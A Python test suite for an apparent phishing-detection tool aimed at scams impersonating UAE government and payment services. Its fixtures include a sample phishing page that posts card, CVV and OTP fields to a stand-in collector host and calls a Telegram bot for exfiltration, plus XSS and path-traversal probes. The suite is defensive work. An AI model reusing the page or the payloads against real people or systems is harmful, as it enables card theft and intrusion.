"""Rasd test-suite (standard library only).   Run:  python -m unittest discover -s tests -v"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import time
import unittest
import urllib.request
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from rasd import analyzer, content, features, netcheck, pipeline, report, scoring, sources, storage  # noqa: E402
from rasd.config import load_config  # noqa: E402
from rasd.util import extract_urls, registered_domain  # noqa: E402

CFG = load_config()
TMP = tempfile.mkdtemp()
storage.DB_PATH = os.path.join(TMP, "test.db")
storage.init()

# Minimal test page with the traits of a phishing kit (no real branding assets).
PHISH_HTML = """<html><head><title>Abu Dhabi Police - Pay traffic fine</title></head><body>
<h2>مخالفة مرورية غير مدفوعة</h2><p>ادفع الآن خلال 24 ساعة لتجنب الغرامة. Pay now to avoid penalty.</p>
<img src="https://www.adpolice.gov.ae/logo.png">
<form action="https://collector.example.net/save.php" method="post">
  <input name="card_number" placeholder="رقم البطاقة"><input name="exp" placeholder="MM/YY">
  <input name="cvv" placeholder="CVV"><input name="otp" placeholder="رمز التحقق">
</form>
<script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>
</body></html>"""

NEWS_HTML = """<html><head><title>Abu Dhabi Police launch new fines discount</title></head><body>
<p>Abu Dhabi Police announced a discount on traffic fines.</p><a href="/a">a</a><a href="/b">b</a>
<a href="/c">c</a><a href="/d">d</a></body></html>"""


def lexical(url):
    s, _ = features.analyze_url(url, CFG)
    return scoring.score(s), {x["id"].split(":")[0] for x in s}


class TestUrlFeatures(unittest.TestCase):
    def test_official_is_zero(self):
        (sc, v), _ = lexical("https://www.adpolice.gov.ae/en/fines")
        self.assertEqual((sc, v), (0, "official"))

    def test_brand_keyword_and_tld(self):
        (sc, v), ids = lexical("http://adpolice-fines-pay.xyz/login")
        self.assertIn("brand_keyword", ids)
        self.assertIn("suspicious_tld", ids)
        self.assertGreaterEqual(sc, 70)

    def test_typosquat_and_homoglyph(self):
        _, ids = lexical("https://uaepas.com")
        self.assertIn("typosquat", ids)
        _, ids = lexical("https://adpo1ice.com/pay")
        self.assertIn("typosquat", ids)

    def test_same_name_other_tld(self):
        _, ids = lexical("https://salik.co/fines")
        self.assertIn("same_name", ids)

    def test_no_false_positive_on_similar_words(self):
        (sc, _), ids = lexical("https://www.tammy-shop.com")
        self.assertLess(sc, 40)
        self.assertNotIn("brand_keyword", ids)

    def test_allowlisted_news(self):
        (sc, _), _ = lexical("https://www.khaleejtimes.com/uae/abu-dhabi-police-fines")
        self.assertLess(sc, 40)

    def test_gov_mimic(self):
        _, ids = lexical("https://tamm-gov-ae.online/payment")
        self.assertIn("gov_mimic", ids)

    def test_free_hosting_registered_domain(self):
        self.assertEqual(registered_domain("evil.netlify.app"), "evil.netlify.app")
        self.assertEqual(registered_domain("www.pay.adpolice.gov.ae"), "adpolice.gov.ae")

    def test_extract_urls_from_sms(self):
        sms = "لديك مخالفة. ادفع عبر https://adpolice-fines.top/pay?id=8812 أو www.salik-pay.online/x - a.b@gmail.com"
        self.assertEqual(extract_urls(sms), ["https://adpolice-fines.top/pay?id=8812", "www.salik-pay.online/x"])


class TestTyposquat(unittest.TestCase):
    def test_candidates(self):
        c = sources.typosquat_candidates("adpolice.gov.ae", 400)
        for expected in ("adpolice.com", "adpolice-pay.com", "adpo1ice.com", "adpolce.com", "adpoilce.com"):
            self.assertIn(expected, c)
        self.assertNotIn("adpolice.gov.ae", c)


class TestContent(unittest.TestCase):
    def test_phishing_page(self):
        sigs, ev = content.analyze_content("https://adpolice-pay.top/", PHISH_HTML, CFG)
        ids = {s["id"].split(":")[0] for s in sigs}
        for expected in ("card_fields", "otp_field", "form_external", "telegram_exfil", "brand_assets", "brand_form", "scam_language"):
            self.assertIn(expected, ids)
        self.assertTrue(ev["has_card_fields"])

    def test_news_page_is_quiet(self):
        sigs, _ = content.analyze_content("https://news.example.com/x", NEWS_HTML, CFG)
        self.assertLess(scoring.score(sigs)[0], 40)


def fake_page(html, url):
    return {"status": 200, "url": url, "headers": {"content-type": "text/html; charset=utf-8"},
            "body": html.encode("utf-8"), "redirects": [], "tls_fallback": False, "error": None}


class TestAnalyzerEndToEnd(unittest.TestCase):
    def _run(self, url, html, age_days):
        with mock.patch.object(netcheck, "resolve", return_value=["93.184.216.34"]), \
             mock.patch.object(netcheck, "fetch_page", side_effect=lambda u, **k: fake_page(html, u)), \
             mock.patch.object(netcheck, "tls_info", return_value={"available": True, "valid": True, "issuer": "Let's Encrypt", "cert_age_days": 2}), \
             mock.patch.object(netcheck, "rdap_domain", return_value={"available": True, "created": "2026-11-18T00:00:00Z", "age_days": age_days, "registrar": "Test Registrar"}):
            return analyzer.analyze(url, CFG, {}, deep=True, sources=["manual"])

    def test_live_phishing_site_is_fraud(self):
        r = self._run("https://adpolice-pay.top/fine", PHISH_HTML, 3)
        self.assertEqual(r["verdict"], "fraud")
        self.assertGreaterEqual(r["score"], 90)
        self.assertIn("young_domain_30", {s["id"] for s in r["signals"]})

    def test_old_news_site_is_low(self):
        r = self._run("https://news.example.com/abu-dhabi-police", NEWS_HTML, 4000)
        self.assertEqual(r["verdict"], "low")

    def test_internal_ip_not_fetched(self):
        with mock.patch.object(netcheck, "fetch_page") as fp:
            r = analyzer.analyze("http://192.168.1.1/admin", CFG, {}, deep=True)
            fp.assert_not_called()
        self.assertIn("internal_ip", {s["id"] for s in r["signals"]})


class TestScoringAndReports(unittest.TestCase):
    def test_noisy_or(self):
        from rasd.signals import sig
        a = sig("a", 0.5, "", "", "url")
        b = sig("b", 0.5, "", "", "url")
        self.assertEqual(scoring.score([a, b])[0], 75)
        t = sig("t", 0.5, "", "", "url", trust=True)
        self.assertEqual(scoring.score([a, b, t])[0], 38)

    def test_dedupe_prefers_manual(self):
        items = pipeline._dedupe([
            {"url": "https://x-pay.top/", "source": "ct", "context": "cert", "extra_signals": []},
            {"url": "https://x-pay.top/login?a=1", "source": "manual", "context": "", "extra_signals": []},
        ])
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["url"], "https://x-pay.top/login?a=1")
        self.assertEqual(items[0]["sources"], ["ct", "manual"])

    def test_report_escapes_and_defangs(self):
        r = {"url": "https://evil.top/<script>", "score": 90, "verdict": "fraud", "verdict_ar": "احتيالي", "verdict_en": "Fraud",
             "registered_domain": "evil.top", "sources": ["ct"], "signals": [],
             "evidence": {"page": {"title": "<script>alert(1)</script>"}}}
        html = report.build_html({"id": "abc", "summary": {}}, [r], "en")
        self.assertNotIn("<script>alert", html)
        self.assertIn("hxxps://evil[.]top", html)
        self.assertIn("evil.top", report.build_csv([r]))


class TestMLModel(unittest.TestCase):
    def test_weights_are_used(self):
        path = os.path.join(TMP, "w.json")
        names = list(features.ml_vector("http://a.com").keys())
        coefs = {n: 0.0 for n in names}
        coefs["suspicious_tld"] = 3.0
        with open(path, "w") as fh:
            json.dump({"coefficients": coefs, "intercept": -1.0, "mean": {n: 0 for n in names}, "std": {n: 1 for n in names}}, fh)
        old = scoring.MODEL_PATH
        try:
            scoring.MODEL_PATH = path
            scoring._model_cache.update(loaded=False, model=None)
            self.assertGreater(scoring.ml_probability("http://x.xyz/"), 0.8)
            self.assertLess(scoring.ml_probability("http://x.com/"), 0.3)
        finally:
            scoring.MODEL_PATH = old
            scoring._model_cache.update(loaded=False, model=None)


class TestServer(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from rasd.server import make_server
        cls.srv = make_server("127.0.0.1", 0)
        cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def req(self, path, data=None, headers=None):
        body = json.dumps(data).encode() if data is not None else None
        r = urllib.request.Request(self.base + path, data=body, headers={"Content-Type": "application/json", **(headers or {})})
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with opener.open(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8")

    def test_dashboard_and_status(self):
        st, body = self.req("/")
        self.assertEqual(st, 200)
        self.assertIn("btnFull", body)
        st, body = self.req("/api/status")
        self.assertEqual(len(json.loads(body)["brands"]), len(CFG["brands"]))

    def test_quick_check_flow_and_reports(self):
        with mock.patch.object(netcheck, "resolve", return_value=[]):
            _, body = self.req("/api/scan/check", {"urls": "رسالة: ادفع https://adpo1ice.com/pay الآن\nhttps://www.adpolice.gov.ae"})
            job_id = json.loads(body)["job_id"]
            for _ in range(50):
                snap = json.loads(self.req(f"/api/jobs/{job_id}")[1])
                if snap["status"] != "running":
                    break
                time.sleep(0.2)
        self.assertEqual(snap["status"], "done")
        self.assertEqual(len(snap["results"]), 2)
        self.assertEqual(snap["results"][0]["host"], "adpo1ice.com")
        st, html = self.req(f"/api/report/{job_id}.html?lang=ar")
        self.assertEqual(st, 200)
        self.assertIn("adpo1ice[.]com", html)
        st, csv_text = self.req(f"/api/report/{job_id}.csv")
        self.assertIn("adpo1ice.com", csv_text)

    def test_cross_origin_post_blocked(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            self.req("/api/settings", {"vt_key": "x"}, {"Origin": "http://evil.example"})
        self.assertEqual(ctx.exception.code, 403)

    def test_static_path_traversal_blocked(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            self.req("/static/../config.json")
        self.assertEqual(ctx.exception.code, 404)


if __name__ == "__main__":
    unittest.main()
